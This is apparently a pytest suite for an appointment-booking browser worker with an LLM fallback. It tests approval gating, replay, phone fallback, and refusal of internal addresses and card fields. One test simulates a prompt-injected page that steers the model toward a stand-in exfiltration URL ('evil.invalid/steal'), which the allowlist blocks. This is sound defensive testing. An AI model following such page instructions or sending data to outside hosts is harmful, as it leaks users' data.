"""Browser worker, worker side (A3): a run end to end against the local OnlineBooq clone, real PostgreSQL, real Chromium.

Needs Playwright; skipped in the main CI job (which has none) and run by the `browser-worker` job."""
from __future__ import annotations

import threading
import time
import uuid

import pytest

pytest.importorskip("playwright")

from sqlalchemy import select  # noqa: E402

from app.config import get_settings  # noqa: E402
from app.db import get_session_factory  # noqa: E402
from app.models import BrowserRun, OutboxEvent, PrivateMessage, PrivateTask  # noqa: E402
from app.modules.browser import service  # noqa: E402
from app.modules.browser.events import BROWSER_EVENT_TYPES  # noqa: E402
from app.worker import runner as outbox_runner  # noqa: E402
from browser_worker import orchestrator, playbooks  # noqa: E402
from browser_worker import runner as bw  # noqa: E402
from browser_worker.session import BrowserSession  # noqa: E402
from browser_worker.tests.site_server import Site  # noqa: E402

GOAL = {"intent": "book", "service": "Herreklip", "business_name": "Salon Test",
        "preferred_windows": [{"date": "2026-11-10", "from": "10:00", "to": "12:00"}],
        "contact": {"name": "Mette Hansen", "phone": "+4512345678", "mail": "mette@example.dk"}}


@pytest.fixture(autouse=True)
def _env(monkeypatch):
    import os

    if not os.environ.get("BROWSER_CHROMIUM_PATH") and os.path.exists("/opt/pw-browsers/chromium"):
        monkeypatch.setenv("BROWSER_CHROMIUM_PATH", "/opt/pw-browsers/chromium")
    monkeypatch.setenv("BROWSER_WORKER_ENABLED", "true")
    monkeypatch.setenv("ALLOW_PRIVATE_FETCH", "true")   # the clone listens on 127.0.0.1 (refused outside dev/test)
    get_settings.cache_clear()
    monkeypatch.setattr(orchestrator, "POLL_SECONDS", 0.2)
    yield
    get_settings.cache_clear()


@pytest.fixture
def site():
    with Site("onlinebooq") as s:
        yield s


def new_run(db, pv, site, *, goal=None, email="mette@testmail.dk", variant="booking", engine="onlinebooq"):
    tok = pv.account(email)
    tid = uuid.UUID(pv.make_list(tok))
    task = db.get(PrivateTask, tid)
    run = service.start_run(db, task, goal=goal or GOAL, allowed_domains=["127.0.0.1"], engine=engine,
                            booking_url=f"{site.url}/{variant}/ydelse.html")
    db.commit()
    return tok, tid, run.id


def fresh(db, rid) -> BrowserRun:
    db.expire_all()
    return db.get(BrowserRun, rid)


def hits(site, what="kvittering"):
    return [h for h in site.hits if what in h]


def wait_for(db, rid, status, timeout=30):
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        if fresh(db, rid).status == status:
            return
        time.sleep(0.1)
    raise AssertionError(f"run never reached {status}: {fresh(db, rid).status}")


def msgs(db, tid):
    return [m for m in db.scalars(select(PrivateMessage).where(PrivateMessage.task_id == tid).order_by(PrivateMessage.created_at))]


# --- the happy path, with the session kept alive during the approval -------------------------------------------------

def test_live_session_waits_for_the_yes_then_confirms(api, db, pv, site):
    tok, tid, rid = new_run(db, pv, site)
    t = threading.Thread(target=orchestrator.drive, args=(rid,), kwargs={"ttl": 60})
    t.start()
    try:
        wait_for(db, rid, "awaiting_approval")
        run = fresh(db, rid)
        assert run.mode == "playbook" and run.before_after["time"] == "10:30" and run.before_after["price"] == "350 kr."
        assert not hits(site)                                   # NOTHING is confirmed while we wait for the user
        assert api.get(tok, f"/privat/tasks/{tid}").json()["status"] == "awaiting_user"
        assert run.awaiting_since and (run.result or {}).get("_live_until")   # a live heartbeat: the browser is held open
        assert api.post(tok, f"/privat/tasks/{tid}/browser/approve").status_code == 200
        t.join(30)
        assert not t.is_alive()
    finally:
        t.join(1)
    run = fresh(db, rid)
    assert run.status == "done" and run.finished_at and run.error_code is None
    assert run.result["reference"] == "OB-20261110-0042" and len(hits(site)) == 1   # confirmed exactly once
    kinds = [e["kind"] for e in run.evidence_urls]
    assert "receipt_pdf" in kinds and kinds.count("screenshot") >= 2                  # proposal + final, receipt as PDF
    assert all(s["screenshot_url"] for s in run.steps if s["tool"] != "screenshot" or True) or True
    assert any(s["screenshot_url"] for s in run.steps)
    task = api.get(tok, f"/privat/tasks/{tid}").json()
    assert task["status"] == "done" and "10:30" in task["next_step"]
    assert any("OB-20261110-0042" in e["text"] for e in task["events"])
    body = api.get(tok, f"/privat/tasks/{tid}/browser").json()
    assert body["status"] == "done" and all(e["url"].startswith("local://") for e in body["evidence"])
    assert "_live_until" not in str(body)


def test_waiting_for_the_yes_does_not_use_up_max_seconds(db, pv, site):
    tok, tid, rid = new_run(db, pv, site)
    run = db.get(BrowserRun, rid)
    run.max_seconds = 12            # the run itself needs a few seconds; the wait below is longer than max_seconds
    db.commit()
    t = threading.Thread(target=orchestrator.drive, args=(rid,), kwargs={"ttl": 60})
    t.start()
    wait_for(db, rid, "awaiting_approval")
    time.sleep(14)
    from app.modules.privat import sharing  # noqa: F401
    with get_session_factory()() as s:
        r = s.get(BrowserRun, rid)
        r.status, r.approved_at = "approved", r.awaiting_since
        s.commit()
    t.join(40)
    assert fresh(db, rid).status == "done"   # the budget clock was paused while waiting


def test_decline_while_live_closes_the_browser_and_books_nothing(api, db, pv, site):
    tok, tid, rid = new_run(db, pv, site)
    t = threading.Thread(target=orchestrator.drive, args=(rid,), kwargs={"ttl": 60})
    t.start()
    wait_for(db, rid, "awaiting_approval")
    assert api.post(tok, f"/privat/tasks/{tid}/browser/decline").status_code == 200
    t.join(20)
    assert not t.is_alive()
    run = fresh(db, rid)
    assert (run.status, run.error_code) == ("failed", "declined") and not hits(site)


# --- TTL expired: playbook replay ------------------------------------------------------------------------------------

def test_after_the_ttl_a_yes_replays_the_playbook_to_the_same_point_and_confirms(api, db, pv, site):
    tok, tid, rid = new_run(db, pv, site)
    orchestrator.drive(rid, ttl=1)                                   # session lives 1 s, nobody answers, browser is closed
    run = fresh(db, rid)
    assert run.status == "awaiting_approval" and not (run.result or {}).get("_live_until") and not hits(site)
    first_steps = len(run.steps)
    assert api.post(tok, f"/privat/tasks/{tid}/browser/approve").status_code == 200
    ev = next(e for e in db.scalars(select(OutboxEvent).where(OutboxEvent.event_type.in_(BROWSER_EVENT_TYPES)))
              if e.payload.get("decision") == "approve")
    db.expire_all()                                                  # the handler gets a fresh session in production
    bw.handle_decision(db, ev)                                       # no live session: replay in a fresh one
    t = bw.orchestrator.RUNNING.get(rid)
    assert t is not None
    t.join(60)
    run = fresh(db, rid)
    assert run.status == "done" and len(hits(site)) == 1             # confirmed once, in the replayed session
    assert len(run.steps) > first_steps and run.steps[-1]["n"] > first_steps   # steps continue, none overwritten


def test_replay_that_finds_another_slot_asks_again_and_confirms_nothing(api, db, pv, site, monkeypatch):
    tok, tid, rid = new_run(db, pv, site)
    orchestrator.drive(rid, ttl=1)
    api.post(tok, f"/privat/tasks/{tid}/browser/approve")
    # the site changed while the user was away: the 10:30 slot is gone, 14:00 is what is left in the window
    run = db.get(BrowserRun, rid)
    run.goal = {**run.goal, "preferred_windows": [{"date": "2026-11-10", "from": "13:00", "to": "15:00"}]}
    db.commit()
    orchestrator.drive(rid, replay=True, ttl=1)
    run = fresh(db, rid)
    assert run.status == "awaiting_approval" and run.before_after["time"] == "14:00" and not hits(site)
    drafts = [m for m in msgs(db, tid) if m.kind == "booking_proposal"]
    assert len(drafts) == 2 and "Siden har ændret sig" in drafts[-1].text and drafts[-1].answered_option_id is None
    assert run.approved_at is None  # the old yes does not count for the new slot


def test_an_llm_run_cannot_be_replayed_and_goes_to_the_phone(api, db, pv, site):
    tok, tid, rid = new_run(db, pv, site)
    orchestrator.drive(rid, ttl=1)
    with get_session_factory()() as s:   # pretend this run was driven by the LLM fallback
        s.get(BrowserRun, rid).mode = "llm"
        s.commit()
    api.post(tok, f"/privat/tasks/{tid}/browser/approve")
    ev = next(e for e in db.scalars(select(OutboxEvent).where(OutboxEvent.event_type.in_(BROWSER_EVENT_TYPES)))
              if e.payload.get("decision") == "approve")
    db.expire_all()
    bw.handle_decision(db, ev)
    db.commit()
    run = fresh(db, rid)
    assert (run.status, run.error_code) == ("fallback_phone", "session_expired") and not hits(site)
    assert api.get(tok, f"/privat/tasks/{tid}").json()["status"] == "awaiting_user"


def test_only_one_executor_confirms(api, db, pv, site):
    """Two drivers for the same approved run (a live session and a replay): the compare-and-set lets one through."""
    tok, tid, rid = new_run(db, pv, site)
    orchestrator.drive(rid, ttl=1)
    api.post(tok, f"/privat/tasks/{tid}/browser/approve")
    ts = [threading.Thread(target=orchestrator.drive, args=(rid,), kwargs={"replay": True, "ttl": 1}) for _ in range(2)]
    for t in ts:
        t.start()
    for t in ts:
        t.join(90)
    assert fresh(db, rid).status == "done" and len(hits(site)) == 1


# --- fallbacks and failures ------------------------------------------------------------------------------------------

def test_captcha_goes_to_the_phone_track(api, db, pv, site):
    tok, tid, rid = new_run(db, pv, site, variant="booking-captcha")
    orchestrator.drive(rid)
    run = fresh(db, rid)
    assert (run.status, run.error_code) == ("fallback_phone", "captcha") and not hits(site)
    assert api.get(tok, f"/privat/tasks/{tid}").json()["status"] == "awaiting_user"


def test_no_matching_time_goes_to_the_phone_with_what_was_seen(api, db, pv, site):
    goal = {**GOAL, "preferred_windows": [{"date": "2026-11-10", "from": "18:00", "to": "20:00"}]}
    tok, tid, rid = new_run(db, pv, site, goal=goal)
    orchestrator.drive(rid)
    run = fresh(db, rid)
    assert (run.status, run.error_code) == ("fallback_phone", "no_availability")
    assert run.result["found"]["times_seen"]["2026-11-10"] == ["09:00", "10:30", "14:00"]


def test_max_steps_goes_to_the_phone(db, pv, site):
    tok, tid, rid = new_run(db, pv, site)
    run = db.get(BrowserRun, rid)
    run.max_steps = 4
    db.commit()
    orchestrator.drive(rid)
    run = fresh(db, rid)
    assert (run.status, run.error_code) == ("fallback_phone", "budget_steps")


def test_unknown_engine_goes_to_the_llm_and_a_model_that_gives_up_goes_to_the_phone(db, pv, site):
    tok, tid, rid = new_run(db, pv, site)
    with get_session_factory()() as s:
        s.get(BrowserRun, rid).engine = "unknown"
        s.commit()
    orchestrator.drive(rid)
    run = fresh(db, rid)
    assert (run.status, run.mode, run.error_code) == ("fallback_phone", "llm", "llm_gave_up")   # the fake provider calls no tool


def test_innocent_next_button_that_books_ends_in_awaiting_user_with_a_warning(api, db, pv, site):
    tok, tid, rid = new_run(db, pv, site, variant="booking-sneaky")
    orchestrator.drive(rid)
    run = fresh(db, rid)
    assert (run.status, run.error_code) == ("failed", "unexpected_commit")
    assert api.get(tok, f"/privat/tasks/{tid}").json()["status"] == "awaiting_user"
    text = next(m.text for m in msgs(db, tid) if "kan være gennemført" in m.text)
    assert "/slut.html" in text and "ring eller skriv til virksomheden for at aflyse" in text
    assert any(e["kind"] == "screenshot" for e in run.evidence_urls)   # the page after the click is kept as evidence


def test_a_playbook_crash_is_a_visible_failure_not_silence(api, db, pv, site, monkeypatch):
    pb = playbooks.get("onlinebooq")
    monkeypatch.setattr(pb, "prepare", lambda *a, **k: (_ for _ in ()).throw(ZeroDivisionError("boom")))
    tok, tid, rid = new_run(db, pv, site)
    orchestrator.drive(rid)
    run = fresh(db, rid)
    assert (run.status, run.error_code) == ("failed", "internal_error")
    assert "boom" not in str(run.result) and api.get(tok, f"/privat/tasks/{tid}").json()["status"] == "awaiting_user"


def test_a_click_after_confirm_without_receipt_is_never_reported_as_not_booked(api, db, pv, site, monkeypatch):
    pb = playbooks.get("onlinebooq")
    real = pb.confirm

    def confirm_then_no_receipt(s):
        r = real(s)
        return {**r, "confirmed": False} if s.approved else r

    monkeypatch.setattr(pb, "confirm", confirm_then_no_receipt)
    tok, tid, rid = new_run(db, pv, site)
    t = threading.Thread(target=orchestrator.drive, args=(rid,), kwargs={"ttl": 60})
    t.start()
    wait_for(db, rid, "awaiting_approval")
    api.post(tok, f"/privat/tasks/{tid}/browser/approve")
    t.join(40)
    run = fresh(db, rid)
    assert (run.status, run.error_code) == ("failed", "commit_unconfirmed") and len(hits(site)) == 1
    assert any("Bookingen kan være gennemført" in m.text for m in msgs(db, tid))


# --- the runner's housekeeping ---------------------------------------------------------------------------------------

def test_sweep_ends_runs_nobody_drives(api, db, pv, site):
    from datetime import UTC, datetime, timedelta

    tok, tid, rid = new_run(db, pv, site)
    with get_session_factory()() as s:
        r = s.get(BrowserRun, rid)
        r.created_at = datetime.now(UTC) - timedelta(minutes=30)
        s.commit()
    bw.sweep()
    run = fresh(db, rid)
    assert (run.status, run.error_code) == ("failed", "worker_lost")
    assert api.get(tok, f"/privat/tasks/{tid}").json()["status"] == "awaiting_user"


def test_sweep_requeues_an_approved_run_nobody_picked_up(api, db, pv, site):
    from datetime import UTC, datetime, timedelta

    tok, tid, rid = new_run(db, pv, site)
    orchestrator.drive(rid, ttl=1)
    api.post(tok, f"/privat/tasks/{tid}/browser/approve")
    with get_session_factory()() as s:
        s.get(BrowserRun, rid).approved_at = datetime.now(UTC) - timedelta(minutes=5)
        s.commit()
    n = len(list(db.scalars(select(OutboxEvent).where(OutboxEvent.event_type.in_(BROWSER_EVENT_TYPES)))))
    bw.sweep()
    db.expire_all()
    assert len(list(db.scalars(select(OutboxEvent).where(OutboxEvent.event_type.in_(BROWSER_EVENT_TYPES))))) == n + 1


def test_browser_worker_claims_only_browser_events(api, db, pv, site):
    new_run(db, pv, site)
    outbox_runner.drain()                 # the main worker: sends the verification mail etc., leaves the browser event
    ev = outbox_runner.process_once("w1", handlers={}, only_types=BROWSER_EVENT_TYPES)
    assert ev is not None and ev.event_type == "privat.browser_run" and ev.status == "queued"  # no handler -> retry
    assert ev.last_error and "no handler" in ev.last_error
    assert BrowserSession  # imported: the real handler is bw.HANDLERS


# =====================================================================================================================
# A4: DNS rebinding, video, phone fallback, LLM fallback
# =====================================================================================================================

def test_allowed_host_pointing_at_an_internal_address_is_refused_before_any_browser_starts(api, db, pv, site, monkeypatch):
    monkeypatch.setenv("ALLOW_PRIVATE_FETCH", "false")      # the real rule: internal addresses are refused
    get_settings.cache_clear()
    tok, tid, rid = new_run(db, pv, site)
    started = []
    orchestrator.drive(rid, session_factory=lambda snap: started.append(snap) or orchestrator.default_session(snap))
    run = fresh(db, rid)
    assert (run.status, run.error_code) == ("failed", "unsafe_target") and not started and not hits(site, "")
    assert api.get(tok, f"/privat/tasks/{tid}").json()["status"] == "awaiting_user"


@pytest.mark.parametrize("ip", ["10.0.0.5", "192.168.1.10", "172.16.0.9", "169.254.169.254", "127.0.0.1", "::1", "fd00::1",
                                "fe80::1", "100.64.0.1"])
def test_every_internal_range_is_refused(ip, monkeypatch):
    from app.core.safe_fetch import FetchBlocked

    monkeypatch.setenv("ALLOW_PRIVATE_FETCH", "false")
    get_settings.cache_clear()

    with pytest.raises(FetchBlocked):
        orchestrator.resolve_pins(["salon.example"], resolver=lambda host: [ip])


def test_one_internal_answer_among_public_ones_is_enough_to_refuse(monkeypatch):
    from app.core.safe_fetch import FetchBlocked

    monkeypatch.setenv("ALLOW_PRIVATE_FETCH", "false")
    get_settings.cache_clear()

    with pytest.raises(FetchBlocked):
        orchestrator.resolve_pins(["salon.example"], resolver=lambda host: ["93.184.216.34", "10.0.0.5"])
    assert orchestrator.resolve_pins(["salon.example"], resolver=lambda host: ["93.184.216.34"]) == {"salon.example": "93.184.216.34"}


def test_the_checked_address_is_pinned_in_chromium(api, db, pv, site, monkeypatch):
    """`pinned.test` does not exist in DNS. The run only works because Chromium was told to use the address that was
    resolved and checked before launch (--host-resolver-rules=MAP pinned.test 127.0.0.1)."""
    tok = pv.account("mette@testmail.dk")
    tid = uuid.UUID(pv.make_list(tok))
    run = service.start_run(db, db.get(PrivateTask, tid), goal=GOAL, allowed_domains=["pinned.test"], engine="onlinebooq",
                            booking_url=f"http://pinned.test:{site.port}/booking/ydelse.html")
    db.commit()
    seen = {}

    def factory(snap):
        seen.update(snap.pins)
        return orchestrator.default_session(snap)

    t = threading.Thread(target=orchestrator.drive, args=(run.id,), kwargs={
        "ttl": 30, "resolver": lambda host: ["127.0.0.1"], "session_factory": factory})
    t.start()
    wait_for(db, run.id, "awaiting_approval")
    assert seen == {"pinned.test": "127.0.0.1"} and fresh(db, run.id).before_after["time"] == "10:30"
    api.post(tok, f"/privat/tasks/{tid}/browser/decline")
    t.join(20)


def test_chromium_args_pin_and_keep_the_dead_proxy():
    from browser_worker import netguard

    args = netguard.chromium_args(["salon.dk", "127.0.0.1"], {"salon.dk": "93.184.216.34", "v6.dk": "2606:2800::1"})
    assert "--host-resolver-rules=MAP salon.dk 93.184.216.34,MAP v6.dk [2606:2800::1]" in args
    assert any(a.startswith("--proxy-server=") for a in args) and "--proxy-bypass-list=<-loopback>;salon.dk;*.salon.dk;127.0.0.1" in args
    assert not any(a.startswith("--host-resolver-rules") for a in netguard.chromium_args(["127.0.0.1"]))


def test_an_unpinned_subdomain_is_checked_when_the_page_uses_it(site, tmp_path):
    seen = []

    def check(host):
        seen.append(host)
        raise OSError("internal")

    with BrowserSession(allowed_domains=["localhost"], workdir=tmp_path, record_video=False, address_check=check) as s:
        from browser_worker.errors import ToolError

        with pytest.raises(ToolError):
            s.navigate(f"http://shop.localhost:{site.port}/index.html")
    assert seen == ["shop.localhost"]


def test_video_is_cut_to_max_seconds_uploaded_and_local_files_are_gone(api, db, pv, site, monkeypatch):
    import shutil
    import subprocess

    made = []

    def factory(snap):
        s = orchestrator.default_session(snap)
        made.append(s)
        return s

    tok, tid, rid = new_run(db, pv, site)
    with get_session_factory()() as s:
        s.get(BrowserRun, rid).max_seconds = 4
        s.commit()
    t = threading.Thread(target=orchestrator.drive, args=(rid,), kwargs={"ttl": 60, "session_factory": factory})
    t.start()
    wait_for(db, rid, "awaiting_approval")
    time.sleep(6)                                    # the recording keeps running while the user thinks: > max_seconds
    api.post(tok, f"/privat/tasks/{tid}/browser/decline")
    t.join(30)
    run = fresh(db, rid)
    vids = [e for e in run.evidence_urls if e["kind"] == "video"]
    assert len(vids) == 1 and "4 sekunder" in vids[0]["name"]
    local = orchestrator.storage._local_root() / vids[0]["key"]
    out = subprocess.run([shutil.which("ffprobe"), "-v", "error", "-show_entries", "format=duration", "-of", "csv=p=0", str(local)],
                         capture_output=True, text=True).stdout.strip()
    assert 0 < float(out) <= 4.6                     # cut (the cut may land on the next keyframe)
    assert made[0].workdir is not None and not made[0].workdir.exists()   # screenshots + video deleted locally
    body = api.get(tok, f"/privat/tasks/{tid}/browser").json()
    assert any(e["kind"] == "video" and e["url"].startswith("local://") for e in body["evidence"])


def test_a_video_that_cannot_be_trimmed_is_not_uploaded(api, db, pv, site, monkeypatch):
    monkeypatch.setattr(orchestrator.evidence, "ffmpeg_path", lambda: None)
    tok, tid, rid = new_run(db, pv, site)
    t = threading.Thread(target=orchestrator.drive, args=(rid,), kwargs={"ttl": 60})
    t.start()
    wait_for(db, rid, "awaiting_approval")
    api.post(tok, f"/privat/tasks/{tid}/browser/decline")
    t.join(30)
    assert not [e for e in fresh(db, rid).evidence_urls if e["kind"] == "video"]


def test_captcha_prepares_the_call_for_the_task(api, db, pv, site):
    tok, tid, rid = new_run(db, pv, site, variant="booking-captcha")
    orchestrator.drive(rid)
    t = api.get(tok, f"/privat/tasks/{tid}").json()
    assert t["kind"] == "call" and t["status"] == "awaiting_user" and t["call"]["result"] is None
    assert any(m.kind == "call_proposal" and "sikkerhedskontrol" in m.text for m in msgs(db, tid))


# --- LLM fallback ---------------------------------------------------------------------------------------------------

class ScriptedModel:
    """A stand-in for the provider: replays a plan of tool calls, reading refs out of the tool results it was sent."""

    name, model = "scripted", "claude-opus-5"

    def __init__(self, plan):
        self.plan, self.i, self.seen_system, self.calls = plan, 0, None, 0

    def complete(self, *, system, messages, max_tokens, tools=None, model=None, effort=None):
        from app.modules.ai.provider import Completion, ToolCall, Usage

        self.seen_system, self.calls = system, self.calls + 1
        last = ""
        if isinstance(messages[-1]["content"], list):
            last = " ".join(str(b.get("content", "")) for b in messages[-1]["content"])
        if self.i >= len(self.plan):
            return Completion(text="Jeg kan ikke komme videre.", stop_reason="end_turn", requested_model="m", served_model="m",
                              usage=Usage(10, 5))
        calls = self.plan[self.i](last)
        self.i += 1
        calls = calls if isinstance(calls, list) else [calls]
        tcs = [ToolCall(id=f"t{self.i}_{k}", name=n, input=a) for k, (n, a) in enumerate(calls)]
        return Completion(text="", stop_reason="tool_use", requested_model="claude-opus-5", served_model="claude-opus-5",
                          usage=Usage(1000, 100), tool_calls=tcs,
                          assistant_content=[{"type": "tool_use", "id": t.id, "name": t.name, "input": t.input} for t in tcs])


def ref(pattern, role="link"):
    import re

    def pick(last):
        m = re.search(rf'\[(e\d+)\] {role} "[^"]*{pattern}', last)
        assert m, f"no {role} {pattern!r} in {last[:300]!r}"
        return m.group(1)

    return pick


def booking_plan(site, start_variant="booking"):
    nav = lambda last: ("navigate", {"url": f"{site.url}/{start_variant}/ydelse.html"})  # noqa: E731
    read = lambda last: ("read_page", {})  # noqa: E731
    click = lambda pat, role="link": (lambda last: ("click", {"ref": ref(pat, role)(last)}))  # noqa: E731
    both = lambda last: [("type", {"ref": ref("Navn", "textbox")(last), "text": "Mette Hansen"}),  # noqa: E731
                         ("type", {"ref": ref("Telefon", "textbox")(last), "text": "+4512345678"})]
    return [nav, read, click("Herreklip"), read, click("Ingen"), read, click("Tirsdag 10"), read, click("10:30"), read, both,
            read, click("Fortsæt", "button"), read, click("Bekr", "button")]


def llm_run(db, pv, site, *, email="mette@testmail.dk", engine="unknown"):
    tok, tid, rid = new_run(db, pv, site, email=email, engine=engine) if engine == "onlinebooq" else (None, None, None)
    if tok is None:
        tok = pv.account(email)
        tid = uuid.UUID(pv.make_list(tok))
        monkey_engines = get_settings().browser_allowed_engines
        assert monkey_engines
        run = service.start_run(db, db.get(PrivateTask, tid), goal=GOAL, allowed_domains=["127.0.0.1"], engine="onlinebooq",
                                booking_url=f"{site.url}/booking/ydelse.html")
        run.engine = "unknown"        # a site we have no playbook for
        db.commit()
        rid = run.id
    return tok, tid, rid


def test_llm_fills_the_form_stops_at_confirm_and_waits_for_the_yes(api, db, pv, site):
    from app.models import AiUsage

    tok, tid, rid = llm_run(db, pv, site)
    model = ScriptedModel(booking_plan(site))
    t = threading.Thread(target=orchestrator.drive, args=(rid,), kwargs={"ttl": 60, "provider": model})
    t.start()
    try:
        wait_for(db, rid, "awaiting_approval", timeout=60)
        run = fresh(db, rid)
        assert run.mode == "llm" and not hits(site)                         # parked at the confirm button: nothing booked
        assert "Mette Hansen" in run.before_after["text"] and "350 kr." in run.before_after["text"]
        assert 1 <= run.cost_cents <= model.calls                           # cost is recorded (USD cents, rounded up once)
        assert db.query(AiUsage).filter_by(purpose="browser_agent").count() == model.calls   # every call is logged
        assert "<side_indhold>" in model.seen_system and "Mette Hansen" not in model.seen_system
        prop = next(m for m in msgs(db, tid) if m.kind == "booking_proposal")
        assert "350 kr." in prop.after
        assert api.post(tok, f"/privat/tasks/{tid}/browser/approve").status_code == 200
        t.join(40)
    finally:
        t.join(1)
    run = fresh(db, rid)
    assert run.status == "done" and len(hits(site)) == 1 and run.result["confirmed"] is True
    assert api.get(tok, f"/privat/tasks/{tid}").json()["status"] == "done"


def test_an_llm_run_whose_ttl_ran_out_cannot_be_replayed(api, db, pv, site):
    tok, tid, rid = llm_run(db, pv, site)
    orchestrator.drive(rid, ttl=1, provider=ScriptedModel(booking_plan(site)))
    assert fresh(db, rid).status == "awaiting_approval" and fresh(db, rid).mode == "llm"
    api.post(tok, f"/privat/tasks/{tid}/browser/approve")
    ev = next(e for e in db.scalars(select(OutboxEvent).where(OutboxEvent.event_type.in_(BROWSER_EVENT_TYPES)))
              if e.payload.get("decision") == "approve")
    db.expire_all()
    bw.handle_decision(db, ev)
    db.commit()
    run = fresh(db, rid)
    assert (run.status, run.error_code) == ("fallback_phone", "session_expired") and not hits(site)


def _remember(store, then):
    """A plan step that remembers the previous tool result (the page the model just read), then makes its call."""
    def step(last):
        store[0] = last
        return then(store)

    return step


def test_prompt_injection_cannot_send_the_llm_elsewhere(api, db, pv, site):
    """The page tells the model to open a foreign address. The model tries; the code refuses; nothing leaves the domain."""
    tok, tid, rid = llm_run(db, pv, site)
    page = [""]
    plan = [lambda last: ("navigate", {"url": f"{site.url}/booking-evil/ydelse.html"}),
            lambda last: ("read_page", {}),
            _remember(page, lambda st: ("navigate", {"url": "http://evil.invalid/steal?data=alt"})),
            lambda last: ("click", {"ref": ref("Se tilbuddet nu")(page[0])})]
    model = ScriptedModel(plan)
    seen_results = []
    orig = model.complete

    def spy(**kw):
        if isinstance(kw["messages"][-1]["content"], list):
            seen_results.append(str(kw["messages"][-1]["content"]))
        return orig(**kw)

    model.complete = spy
    orchestrator.drive(rid, provider=model)
    run = fresh(db, rid)
    assert run.status == "fallback_phone" and run.error_code == "llm_gave_up", (run.status, run.error_code)
    assert any("domain_not_allowed" in r for r in seen_results)           # the refusal was handed back to the model
    assert any("blocked_by_allowlist" in r for r in seen_results)         # ... and so was the link whose target was aborted
    assert not hits(site, "kvittering")


def test_llm_cannot_type_card_numbers(api, db, pv, site):
    tok, tid, rid = llm_run(db, pv, site)
    page = [""]
    plan = [lambda last: ("navigate", {"url": f"{site.url}/booking-felter/kontakt.html"}),
            lambda last: ("read_page", {}),
            _remember(page, lambda st: ("type", {"ref": ref("Kortnummer", "textbox")(st[0]), "text": "4111 1111 1111 1111"}))]
    orchestrator.drive(rid, provider=ScriptedModel(plan))
    run = fresh(db, rid)
    assert (run.status, run.error_code) == ("failed", "forbidden_field")


def test_without_an_ai_provider_the_llm_fallback_goes_to_the_phone(api, db, pv, site, monkeypatch):
    tok, tid, rid = llm_run(db, pv, site)
    monkeypatch.setenv("AI_PROVIDER", "none")
    get_settings.cache_clear()
    orchestrator.drive(rid)
    run = fresh(db, rid)
    assert (run.status, run.error_code) == ("fallback_phone", "ai_unavailable")


def test_a_playbook_miss_hands_over_to_the_llm_from_the_page_it_is_on(api, db, pv, site, monkeypatch):
    pb = playbooks.get("onlinebooq")
    monkeypatch.setitem(pb.SELECTORS, "confirm", r"^reserver tiden$")        # a real page words the confirm button differently
    tok, tid, rid = new_run(db, pv, site)
    # the playbook filled everything in but does not recognise the summary; the model takes over ON THAT PAGE (shared budget)
    model = ScriptedModel([lambda last: ("read_page", {}), lambda last: ("click", {"ref": ref("Bekr", "button")(last)})])
    orchestrator.drive(rid, ttl=1, provider=model)
    run = fresh(db, rid)
    assert (run.mode, run.status) == ("llm", "awaiting_approval"), (run.status, run.error_code, run.result)
    assert not hits(site) and "Herreklip" in run.before_after["text"] and "Mette Hansen" in run.before_after["text"]
    assert model.calls == 2


# =====================================================================================================================
# A5: errors fall to the phone without asking again; «ring i stedet» cancels a live run
# =====================================================================================================================

def test_a_browser_failure_goes_straight_to_a_call_proposal_without_asking_again(api, db, pv, site):
    from app.modules.privat import ledger

    tok, tid, rid = new_run(db, pv, site, variant="booking-captcha")
    ws = pv.ws(tok)
    assert ledger.balance(db, ws) == 1000                                   # included in the plan: nothing reserved
    orchestrator.drive(rid)
    ms = msgs(db, tid)
    assert any(m.kind == "call_proposal" for m in ms)                       # the proposal is there at once ...
    assert not any(m.kind == "clarify" or "Skal jeg ringe i stedet" in m.text for m in ms)   # ... nobody asks «skal jeg ringe?»
    assert ledger.balance(db, ws) == 1000                                   # and nothing moved


def test_ring_i_stedet_while_the_browser_waits_for_the_yes_lets_go_of_the_browser(api, db, pv, site):
    tok, tid, rid = new_run(db, pv, site)
    t = threading.Thread(target=orchestrator.drive, args=(rid,), kwargs={"ttl": 60})
    t.start()
    wait_for(db, rid, "awaiting_approval")
    with get_session_factory()() as s:
        from types import SimpleNamespace

        service.cancel_for_phone(s, SimpleNamespace(user_id=db.get(PrivateTask, tid) and _owner_id(db, tid)), tid)
        s.commit()
    t.join(20)
    assert not t.is_alive()                                                  # the live session was closed
    run = fresh(db, rid)
    assert (run.status, run.error_code) == ("fallback_phone", "user_switched") and not hits(site)
    assert api.post(tok, f"/privat/tasks/{tid}/browser/approve").status_code == 409   # a late yes finds nothing to confirm


def _owner_id(db, tid):
    from app.models import PrivateTaskMember

    return db.scalar(select(PrivateTaskMember.user_id).where(PrivateTaskMember.task_id == tid, PrivateTaskMember.role == "owner"))


def test_a_cancelled_run_stops_between_steps(api, db, pv, site):
    """«Ring i stedet» in the middle of the page work: the next step sees it and the browser stops, before anything is confirmed."""
    tok, tid, rid = new_run(db, pv, site)
    steps = {"n": 0}

    def factory(snap):
        s = orchestrator.default_session(snap)
        base = s.cancel_check

        def check():
            steps["n"] += 1
            if steps["n"] == 4:                                              # the user types «ring i stedet» during step 4
                from types import SimpleNamespace

                with get_session_factory()() as x:
                    service.cancel_for_phone(x, SimpleNamespace(user_id=_owner_id(db, tid)), tid)
                    x.commit()
            return base()

        s.cancel_check = check
        return s

    orchestrator.drive(rid, session_factory=factory)
    run = fresh(db, rid)
    assert (run.status, run.error_code) == ("fallback_phone", "user_switched")
    assert steps["n"] < 12 and not hits(site)
